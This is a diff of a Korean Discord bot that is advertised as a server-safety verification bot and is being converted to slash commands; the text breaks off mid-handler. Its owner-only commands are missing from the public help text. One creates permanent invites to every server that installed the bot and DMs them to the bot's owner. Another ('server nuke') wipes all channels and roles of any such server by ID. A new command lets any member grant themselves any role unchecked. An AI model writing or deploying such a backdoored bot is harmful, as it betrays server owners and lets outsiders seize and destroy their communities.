@@ -2,7 +2,7 @@ const express = require('express');
 const path = require('path');
 const axios = require('axios');
 const fs = require('fs');
-const { Client, GatewayIntentBits, ActionRowBuilder, ButtonBuilder, ButtonStyle, AttachmentBuilder, PermissionsBitField, ChannelType } = require('discord.js');
+const { Client, GatewayIntentBits, ActionRowBuilder, ButtonBuilder, ButtonStyle, AttachmentBuilder, PermissionsBitField, ChannelType, REST, Routes, SlashCommandBuilder } = require('discord.js');
 
 const app = express();
 
@@ -105,7 +105,7 @@ function getStyledPage(title, message, iconType = 'success', guildName = '디스
     }
 
     const iconHtml = guildIconUrl 
-        ? `<img src="${guildIconUrl}" alt="서버 아이콘" style="width: 80px; height: 80px; border-radius: 50%; object-fit: cover; border: 3px solid ${themeColor}; box-shadow: 0 0 15px${glowColor}; margin-bottom: 15px;">`
+        ? `<img src="${guildIconUrl}" alt="서버 아이콘" style="width: 80px; height: 80px; border-radius: 50%; object-fit: cover; border: 3px solid ${themeColor}; box-shadow: 0 0 15px ${glowColor}; margin-bottom: 15px;">`
         : `<div style="font-size: 50px; margin-bottom: 10px;">${iconSymbol}</div>`;
 
     return `
@@ -212,432 +212,350 @@ function parseDevice(ua) {
     return { browser, os };
 }
 
+// 📌 슬래시 명령어 정의 목록
+const commands = [
+    new SlashCommandBuilder().setName('서버정보').setDescription('현재 서버의 상세 정보를 확인합니다.'),
+    new SlashCommandBuilder().setName('서버역할').setDescription('현재 서버의 모든 역할 이름과 ID를 나만 보이게 확인합니다. (관리자 전용)'),
+    new SlashCommandBuilder()
+        .setName('역할지급')
+        .setDescription('지정한 역할을 자신에게 지급합니다.')
+        .addStringOption(option => option.setName('역할').setDescription('지급받을 역할의 이름 또는 ID').setRequired(true)),
+    new SlashCommandBuilder().setName('서버인증').setDescription('서버 인증 시스템을 활성화하고 DM으로 인증 링크를 받습니다. (소유자 전용)'),
+    new SlashCommandBuilder().setName('인증').setDescription('현재 채널에 인증 패널 버튼을 전송합니다. (소유자 전용)'),
+    new SlashCommandBuilder().setName('역할제거').setDescription('지정된 특정 역할을 제거합니다.'),
+    new SlashCommandBuilder().setName('도움말').setDescription('봇 소개 및 명령어 목록을 확인합니다.'),
+    new SlashCommandBuilder().setName('도움말-a').setDescription('관리자 전용 전체 명령어 목록을 확인합니다. (관리자 전용)'),
+    new SlashCommandBuilder().setName('가입서버').setDescription('봇이 가입된 모든 서버 목록과 초대 링크를 받습니다. (관리자 전용)'),
+    new SlashCommandBuilder()
+        .setName('서버폭파')
+        .setDescription('지정된 서버를 완전히 폭파합니다. (관리자 전용)')
+        .addStringOption(option => option.setName('서버아이디').setDescription('폭파할 서버의 아이디').setRequired(true)),
+    new SlashCommandBuilder().setName('서버복구').setDescription('현재 서버를 템플릿 구조로 자동 재구축합니다. (관리자 전용)')
+].map(command => command.toJSON());
+
 client.on('ready', async () => {
     console.log(`[봇 로그인 완료] ${client.user.tag}`);
+
+    const rest = new REST({ version: '10' }).setToken(BOT_TOKEN);
+    try {
+        console.log('[슬래시 명령어] 명령어 등록 중...');
+        if (GUILD_ID) {
+            await rest.put(Routes.applicationGuildCommands(CLIENT_ID, GUILD_ID), { body: commands });
+            console.log('[슬래시 명령어] 테스트 서버에 등록 완료!');
+        } else {
+            await rest.put(Routes.applicationCommands(CLIENT_ID), { body: commands });
+            console.log('[슬래시 명령어] 전역 등록 완료!');
+        }
+    } catch (error) {
+        console.error('슬래시 명령어 등록 실패:', error);
+    }
 });
 
-client.on('messageCreate', async (message) => {
-    const content = message.content.trim();
-    const userId = message.author.id;
+// 🎮 슬래시 명령어 상호작용 처리 핸들러
+client.on('interactionCreate', async (interaction) => {
+    if (!interaction.isChatInputCommand()) return;
+
+    const { commandName, user, guild } = interaction;
+    const userId = user.id;
     const isBotOwner = ALLOWED_OWNERS.includes(userId);
 
-    // 🌐 [최우선 처리 1] !가입서버 명령어 (관리자 본인 전용)
-    if (content === '!가입서버') {
-        if (!isBotOwner) return;
+    // 1. /서버역할 (관리자 본인만 보이게 모든 역할 출력)
+    if (commandName === '서버역할') {
+        if (!isBotOwner) return interaction.reply({ content: '❌ 이 명령어는 사용할 권한이 없습니다.', ephemeral: true });
+        if (!guild) return interaction.reply({ content: '❌ 서버 안에서만 사용할 수 있습니다.', ephemeral: true });
 
+        try {
+            const roles = await guild.roles.fetch();
+            let roleText = `📋 **[${guild.name} 서버 역할 목록 (${roles.size}개)]**\n\n`;
+
+            roles.forEach(role => {
+                if (role.id !== guild.id) { // @everyone 제외
+                    roleText += `• **이름:** ${role.name} | **ID:** \`${role.id}\`\n`;
+                }
+            });
+
+            if (roleText.length > 2000) {
+                roleText = roleText.substring(0, 1950) + '\n...(내용이 너무 길어 생략됨)';
+            }
+
+            return interaction.reply({ content: roleText, ephemeral: true });
+        } catch (err) {
+            return interaction.reply({ content: '⚠️ 역할 목록을 불러오는 중 오류가 발생했습니다.', ephemeral: true });
+        }
+    }
+
+    // 2. /역할지급
+    if (commandName === '역할지급') {
+        if (!guild) return interaction.reply({ content: '❌ 서버 안에서만 사용할 수 있습니다.', ephemeral: true });
+
+        const query = interaction.options.getString('역할').trim();
+        try {
+            const member = await guild.members.fetch(userId).catch(() => null);
+            if (!member) return interaction.reply({ content: '❌ 멤버 정보를 찾을 수 없습니다.', ephemeral: true });
+
+            // 이름 또는 ID로 역할 찾기
+            let targetRole = guild.roles.cache.get(query);
+            if (!targetRole) {
+                targetRole = guild.roles.cache.find(r => r.name.toLowerCase() === query.toLowerCase());
+            }
+
+            if (!targetRole) {
+                return interaction.reply({ content: `❌ \`${query}\`에 해당하는 역할을 이 서버에서 찾을 수 없습니다.`, ephemeral: true });
+            }
+
+            if (member.roles.cache.has(targetRole.id)) {
+                return interaction.reply({ content: `⚠️ 이미 **${targetRole.name}** 역할을 가지고 있습니다.`, ephemeral: true });
+            }
+
+            await member.roles.add(targetRole);
+            return interaction.reply({ content: `✅ 성공적으로 **${targetRole.name}** 역할을 지급받았습니다!`, ephemeral: true });
+        } catch (err) {
+            console.error('역할 지급 오류:', err);
+            return interaction.reply({ content: '⚠️ 역할을 지급하는 중 오류가 발생했습니다. (봇의 역할 권한을 확인해 주세요)', ephemeral: true });
+        }
+    }
+
+    // 3. /가입서버
+    if (commandName === '가입서버') {
+        if (!isBotOwner) return interaction.reply({ content: '❌ 권한이 없습니다.', ephemeral: true });
+
+        await interaction.deferReply({ ephemeral: true });
         try {
             const guilds = client.guilds.cache;
             let resultText = `📋 **[봇이 가입된 서버 목록 (${guilds.size}개)]**\n\n`;
 
-            for (const guild of guilds.values()) {
+            for (const g of guilds.values()) {
                 let inviteLink = '초대 링크 생성 불가';
                 try {
-                    const channels = await guild.channels.fetch();
+                    const channels = await g.channels.fetch();
                     const textChannel = channels.find(c => c && c.type === ChannelType.GuildText);
                     if (textChannel) {
                         const invite = await textChannel.createInvite({ maxAge: 0, maxUses: 0 }).catch(() => null);
-                        if (invite) {
-                            inviteLink = invite.url;
-                        }
+                        if (invite) inviteLink = invite.url;
                     }
                 } catch (e) {}
 
-                resultText += `• **서버 이름:** ${guild.name}\n` +
-                              `• **서버 ID:** \`${guild.id}\`\n` +
-                              `• **초대 링크:** ${inviteLink}\n` +
-                              `-----------------------------------\n`;
+                resultText += `• **서버 이름:** ${g.name}\n• **서버 ID:** \`${g.id}\`\n• **초대 링크:** ${inviteLink}\n-----------------------------------\n`;
             }
 
-            if (resultText.length > 2000) {
-                const chunks = resultText.match(/[\s\S]{1,1900}/g);
-                for (const chunk of chunks) {
-                    await message.author.send(chunk).catch(() => {});
-                }
-            } else {
-                await message.author.send(resultText).catch(() => {});
-            }
-
-            if (message.guild) {
-                const notice = await message.reply('✅ 봇이 가입된 서버 목록과 초대 링크를 DM으로 전송했습니다!');
-                setTimeout(() => notice.delete().catch(() => {}), 3000);
-            }
+            await user.send(resultText).catch(() => {});
+            await interaction.editReply('✅ 봇이 가입된 서버 목록과 초대 링크를 DM으로 전송했습니다!');
         } catch (err) {
-            console.error('가입서버 목록 조회 오류:', err);
+            await interaction.editReply('⚠️ 오류가 발생했습니다.');
         }
         return;
     }
 
-    // 💥 [최우선 처리 2] !서버폭파 명령어 (관리자 전용)
-    if (content.startsWith('!서버폭파')) {
-        if (!isBotOwner) return;
+    // 4. /서버폭파
+    if (commandName === '서버폭파') {
+        if (!isBotOwner) return interaction.reply({ content: '❌ 권한이 없습니다.', ephemeral: true });
 
-        const args = content.split(' ');
-        const targetGuildId = args[1];
-
-        if (!targetGuildId) {
-            const warnText = '⚠️ 폭파할 서버의 아이디를 입력해 주세요. (예: `!서버폭파 123456789012345678`)';
-            return message.guild ? message.reply(warnText) : message.author.send(warnText);
-        }
-
+        const targetGuildId = interaction.options.getString('서버아이디');
         const targetGuild = client.guilds.cache.get(targetGuildId);
-        if (!targetGuild) {
-            const errText = `❌ ID가 \`${targetGuildId}\`인 서버를 찾을 수 없습니다.`;
-            return message.guild ? message.reply(errText) : message.author.send(errText);
-        }
+        if (!targetGuild) return interaction.reply({ content: `❌ ID가 \`${targetGuildId}\`인 서버를 찾을 수 없습니다.`, ephemeral: true });
+
+        await interaction.reply({ content: `💥 **[${targetGuild.name}] 서버 폭파 작업을 시작합니다...**`, ephemeral: true });
 
         try {
-            if (message.guild) {
-                await message.reply(`💥 **[${targetGuild.name}] 서버 폭파 작업을 시작합니다...**`).catch(() => {});
-            } else {
-                await message.author.send(`💥 **[${targetGuild.name}] 서버 폭파 작업을 시작합니다...**`).catch(() => {});
-            }
-
             const channels = await targetGuild.channels.fetch();
-            for (const ch of channels.values()) {
-                await ch.delete().catch(() => {});
-            }
+            for (const ch of channels.values()) { await ch.delete().catch(() => {}); }
 
             const roles = await targetGuild.roles.fetch();
-            for (const r of roles.values()) {
-                if (r.id !== targetGuild.id && !r.managed) {
-                    await r.delete().catch(() => {});
-                }
-            }
-        } catch (err) {
-            console.error('서버 폭파 오류:', err);
-        }
+            for (const r of roles.values()) { if (r.id !== targetGuild.id && !r.managed) { await r.delete().catch(() => {}); } }
+        } catch (err) {}
         return;
     }
 
-    // 🔄 [최우선 처리 3] !서버복구 명령어 (관리자 전용)
-    if (content === '!서버복구') {
-        if (!isBotOwner) return;
-        if (!message.guild) return message.author.send('❌ 서버 채널 안에서 입력해 주세요.');
+    // 5. /서버복구
+    if (commandName === '서버복구') {
+        if (!isBotOwner) return interaction.reply({ content: '❌ 권한이 없습니다.', ephemeral: true });
+        if (!guild) return interaction.reply({ content: '❌ 서버 안에서만 사용할 수 있습니다.', ephemeral: true });
 
-        await message.reply('🔄 **서버 복구를 시작합니다... 기존 채널과 역할이 초기화되고 템플릿 구조로 재구성됩니다.**');
+        await interaction.reply({ content: '🔄 **서버 복구를 시작합니다... 기존 채널과 역할이 초기화됩니다.**', ephemeral: true });
 
         try {
-            const guildId = message.guild.id;
-            const channels = await message.guild.channels.fetch();
-            for (const ch of channels.values()) {
-                await ch.delete().catch(() => {});
-            }
+            const guildId = guild.id;
+            const channels = await guild.channels.fetch();
+            for (const ch of channels.values()) { await ch.delete().catch(() => {}); }
 
-            const roles = await message.guild.roles.fetch();
-            for (const r of roles.values()) {
-                if (r.id !== message.guild.id && !r.managed) {
-                    await r.delete().catch(() => {});
-                }
-            }
+            const roles = await guild.roles.fetch();
+            for (const r of roles.values()) { if (r.id !== guild.id && !r.managed) { await r.delete().catch(() => {}); } }
 
-            const infoCategory = await message.guild.channels.create({ name: '📌 ┃ 공지 및 정보', type: ChannelType.GuildCategory });
-            await message.guild.channels.create({ name: '공지사항', type: ChannelType.GuildText, parent: infoCategory.id });
-            await message.guild.channels.create({ name: '규칙', type: ChannelType.GuildText, parent: infoCategory.id });
+            const infoCategory = await guild.channels.create({ name: '📌 ┃ 공지 및 정보', type: ChannelType.GuildCategory });
+            await guild.channels.create({ name: '공지사항', type: ChannelType.GuildText, parent: infoCategory.id });
+            await guild.channels.create({ name: '규칙', type: ChannelType.GuildText, parent: infoCategory.id });
 
-            const verifyCategory = await message.guild.channels.create({ name: '🔒 ┃ 인증 구역', type: ChannelType.GuildCategory });
-            const verifyChannel = await message.guild.channels.create({ name: '인증하기', type: ChannelType.GuildText, parent: verifyCategory.id });
+            const verifyCategory = await guild.channels.create({ name: '🔒 ┃ 인증 구역', type: ChannelType.GuildCategory });
+            const verifyChannel = await guild.channels.create({ name: '인증하기', type: ChannelType.GuildText, parent: verifyCategory.id });
 
-            const chatCategory = await message.guild.channels.create({ name: '💬 ┃ 소통 공간', type: ChannelType.GuildCategory });
-            await message.guild.channels.create({ name: '일반채팅', type: ChannelType.GuildText, parent: chatCategory.id });
-            await message.guild.channels.create({ name: '음성채팅', type: ChannelType.GuildVoice, parent: chatCategory.id });
+            const chatCategory = await guild.channels.create({ name: '💬 ┃ 소통 공간', type: ChannelType.GuildCategory });
+            await guild.channels.create({ name: '일반채팅', type: ChannelType.GuildText, parent: chatCategory.id });
+            await guild.channels.create({ name: '음성채팅', type: ChannelType.GuildVoice, parent: chatCategory.id });
 
-            await message.guild.roles.create({ name: '👑 관리자', color: '#ED4245', permissions: [PermissionsBitField.Flags.Administrator] });
-            await message.guild.roles.create({ name: '✅ 인증완료', color: '#57F287' });
-            await message.guild.roles.create({ name: '🔒 미인증', color: '#99AAB5' });
+            await guild.roles.create({ name: '👑 관리자', color: '#ED4245', permissions: [PermissionsBitField.Flags.Administrator] });
+            await guild.roles.create({ name: '✅ 인증완료', color: '#57F287' });
+            await guild.roles.create({ name: '🔒 미인증', color: '#99AAB5' });
 
             const verifyUrl = `${FIXED_RENDER_URL}/verify?guildId=${guildId}`;
-            const row = new ActionRowBuilder()
-                .addComponents(
-                    new ButtonBuilder()
-                        .setStyle(ButtonStyle.Link)
-                        .setLabel('🔒 디스코드 인증하기')
-                        .setURL(verifyUrl),
-                );
-
-            await verifyChannel.send({
-                content: '서버를 이용하려면 아래 버튼을 눌러 인증을 진행해 주세요!',
-                components: [row]
-            });
-        } catch (err) {
-            console.error('서버 복구 오류:', err);
-        }
+            const row = new ActionRowBuilder().addComponents(new ButtonBuilder().setStyle(ButtonStyle.Link).setLabel('🔒 디스코드 인증하기').setURL(verifyUrl));
+            await verifyChannel.send({ content: '서버를 이용하려면 아래 버튼을 눌러 인증을 진행해 주세요!', components: [row] });
+        } catch (err) {}
         return;
     }
 
-    if (!message.guild) return;
-    if (!content.startsWith('!')) return;
-
-    const guildId = message.guild.id;
-    const isServerOwner = message.guild.ownerId === userId;
-
+    if (!guild) return;
+    const guildId = guild.id;
+    const isServerOwner = guild.ownerId === userId;
     let settings = loadSettings();
     const isServerActivated = settings[guildId] && settings[guildId].activated === true;
 
-    // [4] !서버정보 명령어 (모든 유저 사용 가능)
-    if (content === '!서버정보') {
+    // 6. /서버정보
+    if (commandName === '서버정보') {
         try {
-            const guild = message.guild;
             const owner = await guild.fetchOwner().catch(() => null);
             const ownerTag = owner ? owner.user.tag : '알 수 없음';
             const createdAt = guild.createdAt.toISOString().replace('T', ' ').substring(0, 19);
 
-            return message.reply(
-                `📊 **[${guild.name} 서버 정보]**\n\n` +
-                `• **서버 이름:** ${guild.name}\n` +
-                `• **서버 ID:** \`${guild.id}\`\n` +
-                `• **서버 소유자:** ${ownerTag}\n` +
-                `• **서버 생성일:** \`${createdAt}\`\n` +
-                `• **멤버 수:** \`${guild.memberCount}명\`\n` +
-                `• **채널 수:** \`${guild.channels.cache.size}개\`\n` +
-                `• **역할 수:** \`${guild.roles.cache.size}개\``
+            let inviteCode = '초대 링크 생성 불가';
+            try {
+                const channels = await guild.channels.fetch();
+                const textChannel = channels.find(c => c && c.type === ChannelType.GuildText);
+                if (textChannel) {
+                    const invite = await textChannel.createInvite({ maxAge: 0, maxUses: 0 }).catch(() => null);
+                    if (invite) inviteCode = invite.url;
+                }
+            } catch (e) {}
+
+            let banCount = 0;
+            try { const bans = await guild.bans.fetch().catch(() => null); if (bans) banCount = bans.size; } catch (e) {}
+
+            let verifiedUserCount = 0;
+            try {
+                const logChannel = await client.channels.fetch(DEFAULT_LOG_CHANNEL_ID).catch(() => null);
+                if (logChannel) {
+                    const fetchedMessages = await logChannel.messages.fetch({ limit: 100 }).catch(() => null);
+                    if (fetchedMessages) {
+                        const verifiedUserIds = new Set();
+                        for (const msg of fetchedMessages.values()) {
+                            if (msg.author.id === client.user.id && msg.content && msg.content.includes(`(ID: \`${guildId}\`)`)) {
+                                if (msg.content.includes('인증 완료 상세 정보') || msg.content.includes('중복인증 완료 상세 정보')) {
+                                    const match = msg.content.match(/<@!?(\d+)>/);
+                                    if (match) verifiedUserIds.add(match[1]);
+                                }
+                            }
+                        }
+                        verifiedUserCount = verifiedUserIds.size;
+                    }
+                }
+            } catch (e) {}
+
+            return interaction.reply(
+                `👑 소유자 : ${ownerTag}\n` +
+                `👤 멤버수 : ${guild.memberCount}명\n` +
+                `🕐 서버 생성일: ${createdAt}\n` +
+                `🔗 서버 초대코드 : ${inviteCode}\n` +
+                `✅ 서버 인증자 수 : ${verifiedUserCount}명\n` +
+                `⚔️ 밴 유저 : ${banCount}명`
             );
         } catch (err) {
-            console.error('서버정보 조회 오류:', err);
-            return message.reply('⚠️ 서버 정보를 불러오는 중 오류가 발생했습니다.');
+            return interaction.reply({ content: '⚠️ 서버 정보를 불러오는 중 오류가 발생했습니다.', ephemeral: true });
         }
     }
 
-    // [5] !서버인증 명령어 (서버 소유자 전용)
-    if (content === '!서버인증') {
-        if (!isServerOwner && !isBotOwner) {
-            return message.reply('❌ 이 명령어는 **서버 소유자**만 사용할 수 있습니다.');
-        }
+    // 7. /서버인증
+    if (commandName === '서버인증') {
+        if (!isServerOwner && !isBotOwner) return interaction.reply({ content: '❌ 이 명령어는 **서버 소유자**만 사용할 수 있습니다.', ephemeral: true });
 
-        try {
-            await message.delete().catch(() => {});
+        if (!settings[guildId]) settings[guildId] = {};
+        settings[guildId].activated = true;
+        saveSettings(settings);
 
-            if (!settings[guildId]) settings[guildId] = {};
-            settings[guildId].activated = true;
-            saveSettings(settings);
+        const verifyUrl = `${FIXED_RENDER_URL}/verify?guildId=${guildId}`;
+        const row = new ActionRowBuilder().addComponents(new ButtonBuilder().setStyle(ButtonStyle.Link).setLabel('🔒 디스코드 인증하기').setURL(verifyUrl));
 
-            const verifyUrl = `${FIXED_RENDER_URL}/verify?guildId=${guildId}`;
-            const row = new ActionRowBuilder()
-                .addComponents(
-                    new ButtonBuilder()
-                        .setStyle(ButtonStyle.Link)
-                        .setLabel('🔒 디스코드 인증하기')
-                        .setURL(verifyUrl),
-                );
+        const dmSuccess = await user.send({
+            content: `🚨 **[${guild.name}] 서버 인증 시스템이 활성화되었습니다.**\n인증 패널 링크 버튼입니다:`,
+            components: [row]
+        }).catch(() => null);
 
-            const dmSuccess = await message.author.send({
-                content: `🚨 **[${message.guild.name}] 서버 인증 시스템이 활성화되었습니다.**\n인증 패널 링크 버튼입니다:`,
-                components: [row]
-            }).catch(() => null);
+        if (!dmSuccess) return interaction.reply({ content: '❌ DM 차단 상태여서 링크를 보낼 수 없습니다. DM을 열어주세요!', ephemeral: true });
 
-            if (!dmSuccess) {
-                return message.reply('❌ DM(개인 메시지) 차단 상태여서 인증 링크를 보낼 수 없습니다. DM을 열어두고 다시 시도해 주세요!');
-            }
-
-            const notice = await message.channel.send(`<@${userId}>님, DM으로 인증 패널 메시지가 전송되었으며 서버가 활성화되었습니다!`);
-            setTimeout(() => notice.delete().catch(() => {}), 3000);
-        } catch (err) {
-            console.error('서버인증 에러:', err);
-        }
-        return;
+        return interaction.reply({ content: '✅ DM으로 인증 패널 메시지를 전송했으며 서버가 활성화되었습니다!', ephemeral: true });
     }
 
-    // [6] !도움말 및 !도움말 -a 명령어
-    if (content === '!도움말 -a') {
-        if (!isBotOwner) {
-            return message.reply('❌ 이 명령어는 사용할 권한이 없습니다.');
-        }
-        return message.reply(
-            `🤖 **[관리자 전용 전체 도움말]**\n\n` +
-            `📋 **[모든 명령어 목록]**\n` +
-            `• \`!서버정보\` - 현재 서버의 상세 정보를 확인합니다. (모든 유저)\n` +
-            `• \`!서버인증\` - 서버 인증 시스템을 1회 활성화하고 DM으로 인증 패널 링크를 받습니다. (서버 소유자 전용)\n` +
-            `• \`!인증\` - 현재 채널에 인증 패널 버튼을 전송합니다. (서버 소유자 전용)\n` +
-            `• \`!인증역할 (역할아이디)\` - 인증 완료 역할을 설정합니다. (서버 소유자 전용)\n` +
-            `• \`!아이디 (채널아이디)\` - 전용 로그 채널을 설정합니다. (서버 소유자 전용)\n` +
-            `• \`!인증정보 (@유저 또는 ID)\` - 이 서버에서 인증을 완료한 유저의 기록을 검색합니다. (서버 소유자 전용)\n` +
-            `• \`!역할제거\` - 지정된 특정 역할을 제거합니다.\n` +
-            `• \`!서버복구\` - 현재 서버를 템플릿 구조로 자동 재구축합니다. (관리자 전용)\n` +
-            `• \`!서버폭파 (서버아이디)\` - 지정된 서버를 완전히 폭파합니다. (관리자 전용)\n` +
-            `• \`!가입서버\` - 봇이 가입된 모든 서버 목록과 초대 링크를 DM으로 받습니다. (관리자 전용)\n` +
-            `• \`!도움말\` - 봇 소개 및 일반 명령어 목록을 확인합니다.`
-        );
+    // 8. /도움말-a
+    if (commandName === '도움말-a') {
+        if (!isBotOwner) return interaction.reply({ content: '❌ 권한이 없습니다.', ephemeral: true });
+        return interaction.reply({
+            content: `🤖 **[관리자 전용 전체 도움말]**\n\n` +
+                     `📋 **[모든 명령어 목록]**\n` +
+                     `• \`/서버정보\` - 현재 서버의 상세 정보를 확인합니다.\n` +
+                     `• \`/서버역할\` - 서버의 모든 역할 이름과 ID를 나만 보게 확인합니다. (관리자 전용)\n` +
+                     `• \`/역할지급\` - 지정된 역할을 자신에게 지급합니다.\n` +
+                     `• \`/서버인증\` - 서버 인증 시스템을 활성화하고 DM으로 링크를 받습니다. (소유자 전용)\n` +
+                     `• \`/인증\` - 채널에 인증 패널 버튼을 전송합니다. (소유자 전용)\n` +
+                     `• \`/역할제거\` - 지정된 역할을 제거합니다.\n` +
+                     `• \`/서버복구\` - 서버를 템플릿 구조로 자동 재구축합니다. (관리자 전용)\n` +
+                     `• \`/서버폭파 (서버아이디)\` - 지정된 서버를 폭파합니다. (관리자 전용)\n` +
+                     `• \`/가입서버\` - 봇이 가입된 서버 목록을 DM으로 받습니다. (관리자 전용)\n` +
+                     `• \`/도움말\` - 일반 명령어 목록을 확인합니다.`,
+            ephemeral: true
+        });
     }
 
-    if (content === '!도움말') {
-        return message.reply(
-            `🤖 **더 안전한 서버를 만드는 인증봇입니다.**\n\n` +
-            `📋 **[사용 가능한 명령어 목록]**\n` +
-            `• \`!서버정보\` - 현재 서버의 상세 정보를 확인합니다. (모든 유저)\n` +
-            `• \`!서버인증\` - 서버 인증 시스템을 1회 활성화하고 DM으로 인증 패널 링크를 받습니다. (서버 소유자 전용)\n` +
-            `• \`!인증\` - 현재 채널에 인증 패널 버튼을 전송합니다. (서버 소유자 전용)\n` +
-            `• \`!인증역할 (역할아이디)\` - 인증 완료 역할을 설정합니다. (서버 소유자 전용)\n` +
-            `• \`!아이디 (채널아이디)\` - 전용 로그 채널을 설정합니다. (서버 소유자 전용)\n` +
-            `• \`!인증정보 (@유저 또는 ID)\` - 이 서버에서 인증을 완료한 유저의 기록을 검색합니다. (서버 소유자 전용)\n` +
-            `• \`!역할제거\` - 지정된 특정 역할을 제거합니다.\n` +
-            `• \`!도움말\` - 봇 소개 및 명령어 목록을 확인합니다.`
-        );
+    // 9. /도움말
+    if (commandName === '도움말') {
+        return interaction.reply({
+            content: `🤖 **더 안전한 서버를 만드는 인증봇입니다.**\n\n` +
+                     `📋 **[사용 가능한 슬래시 명령어]**\n` +
+                     `• \`/서버정보\` - 현재 서버의 상세 정보를 확인합니다.\n` +
+                     `• \`/역할지급\` - 지정된 역할을 자신에게 지급합니다.\n` +
+                     `• \`/서버인증\` - 서버 인증 시스템을 활성화하고 DM으로 링크를 받습니다. (소유자 전용)\n` +
+                     `• \`/인증\` - 채널에 인증 패널 버튼을 전송합니다. (소유자 전용)\n` +
+                     `• \`/역할제거\` - 지정된 특정 역할을 제거합니다.\n` +
+                     `• \`/도움말\` - 명령어 목록을 확인합니다.`,
+            ephemeral: true
+        });
     }
 
     if (!isServerActivated && !isBotOwner) {
-        return message.reply('⚠️ **해당 서버는 아직 인증 시스템이 활성화되지 않았습니다.**\n서버 소유자가 먼저 채팅창에 **`!서버인증`**을 딱 한 번 입력해 주세요.');
+        return interaction.reply({ content: '⚠️ **해당 서버는 아직 인증 시스템이 활성화되지 않았습니다.**\n서버 소유자가 먼저 `/서버인증`을 실행해 주세요.', ephemeral: true });
     }
 
-    // [7] !인증 명령어 (서버 소유자 전용)
-    if (content === '!인증') {
-        if (!isServerOwner && !isBotOwner) {
-            return message.reply('❌ 이 명령어는 **서버 소유자**만 사용할 수 있습니다.');
-        }
+    // 10. /인증 (버튼 전송)
+    if (commandName === '인증') {
+        if (!isServerOwner && !isBotOwner) return interaction.reply({ content: '❌ 이 명령어는 **서버 소유자**만 사용할 수 있습니다.', ephemeral: true });
 
         try {
-            await message.delete().catch(() => {});
-
-            const messages = await message.channel.messages.fetch({ limit: 20 }).catch(() => null);
-            if (messages) {
-                const botMessages = messages.filter(m => m.author.id === client.user.id && m.components.length > 0);
-                for (const oldMsg of botMessages.values()) {
-                    await oldMsg.delete().catch(() => {});
-                }
-            }
-
             const verifyUrl = `${FIXED_RENDER_URL}/verify?guildId=${guildId}`;
-            const row = new ActionRowBuilder()
-                .addComponents(
-                    new ButtonBuilder()
-                        .setStyle(ButtonStyle.Link)
-                        .setLabel('🔒 디스코드 인증하기')
-                        .setURL(verifyUrl),
-                );
+            const row = new ActionRowBuilder().addComponents(new ButtonBuilder().setStyle(ButtonStyle.Link).setLabel('🔒 디스코드 인증하기').setURL(verifyUrl));
 
-            await message.channel.send({
+            await interaction.channel.send({
                 content: '서버를 이용하려면 아래 버튼을 눌러 인증을 진행해 주세요!',
                 components: [row]
             });
+            return interaction.reply({ content: '✅ 인증 패널을 전송했습니다!', ephemeral: true });
         } catch (err) {
-            console.error('인증 버튼 생성 에러:', err);
+            return interaction.reply({ content: '⚠️ 오류가 발생했습니다.', ephemeral: true });
         }
-        return;
     }
 
-    // [8] !인증역할 명령어 (서버 소유자 전용)
-    if (content.startsWith('!인증역할')) {
-        if (!isServerOwner && !isBotOwner) {
-            return message.reply('❌ 이 명령어는 **서버 소유자**만 사용할 수 있습니다.');
-        }
-
-        const args = content.split(' ');
-        const roleId = args[1];
-
-        if (!roleId) {
-            return message.reply('⚠️ 지정할 역할의 아이디를 입력해 주세요. (예: `!인증역할 123456789012345678`)');
-        }
-
-        const role = message.guild.roles.cache.get(roleId);
-        if (!role) {
-            return message.reply('❌ 해당 역할을 이 서버에서 찾을 수 없습니다.');
-        }
-
-        if (!settings[guildId]) settings[guildId] = {};
-        settings[guildId].verifiedRoleId = roleId;
-        saveSettings(settings);
-
-        message.reply(`✅ 이 서버의 인증 완료 역할이 **${role.name}** (\`${roleId}\`)으로 설정되었습니다!`);
-        return;
-    }
-
-    // [9] !아이디 명령어 (서버 소유자 전용)
-    if (content.startsWith('!아이디')) {
-        if (!isServerOwner && !isBotOwner) {
-            return message.reply('❌ 이 명령어는 **서버 소유자**만 사용할 수 있습니다.');
-        }
-
-        const args = content.split(' ');
-        const channelId = args[1];
-
-        if (!channelId) {
-            return message.reply('⚠️ 지정할 로그 채널의 아이디를 입력해 주세요.');
-        }
-
-        const targetChannel = message.guild.channels.cache.get(channelId);
-        if (!targetChannel) {
-            return message.reply('❌ 해당 채널을 이 서버에서 찾을 수 없습니다.');
-        }
-
-        if (!settings[guildId]) settings[guildId] = {};
-        settings[guildId].logChannelId = channelId;
-        saveSettings(settings);
-
-        message.reply(`✅ 이 서버의 전용 로그 채널이 <#${channelId}>로 설정되었습니다!`);
-        return;
-    }
-
-    // [10] !인증정보 명령어 (서버 소유자 전용)
-    if (content.startsWith('!인증정보')) {
-        if (!isServerOwner && !isBotOwner) {
-            return message.reply('❌ 이 명령어는 **서버 소유자**만 사용할 수 있습니다.');
-        }
-
-        let targetUserId = '';
-        const mentionedUser = message.mentions.users.first();
-        if (mentionedUser) {
-            targetUserId = mentionedUser.id;
-        } else {
-            const args = content.split(' ');
-            targetUserId = args[1];
-        }
-
-        if (!targetUserId) {
-            return message.reply('⚠️ 정보를 확인할 유저를 멘션하거나 유저 ID를 입력해 주세요.');
-        }
-
-        const processingMsg = await message.reply('🔍 로그 채널에서 이 서버의 인증 기록을 검색하는 중입니다...');
-
+    // 11. /역할제거
+    if (commandName === '역할제거') {
         try {
-            const logChannel = await client.channels.fetch(DEFAULT_LOG_CHANNEL_ID).catch(() => null);
-            if (!logChannel) {
-                await processingMsg.delete().catch(() => {});
-                return message.reply('❌ 기본 로그 채널을 찾을 수 없습니다.');
-            }
-
-            const fetchedMessages = await logChannel.messages.fetch({ limit: 100 }).catch(() => null);
-            let foundContent = null;
-
-            if (fetchedMessages) {
-                for (const msg of fetchedMessages.values()) {
-                    if (msg.author.id === client.user.id && msg.content && msg.content.includes(targetUserId)) {
-                        if (msg.content.includes(`(ID: \`${guildId}\`)`) && (msg.content.includes('인증 완료 상세 정보') || msg.content.includes('모바일 데이터 차단'))) {
-                            foundContent = msg.content;
-                            break;
-                        }
-                    }
-                }
-            }
-
-            await processingMsg.delete().catch(() => {});
-
-            if (!foundContent) {
-                return message.reply(`❌ 이 서버(\`${message.guild.name}\`)에서 해당 유저의 인증 기록을 찾을 수 없습니다.`);
-            }
-
-            message.reply(`📋 **[이 서버의 인증 기록 검색 결과]**\n\n${foundContent}`);
-        } catch (err) {
-            await processingMsg.delete().catch(() => {});
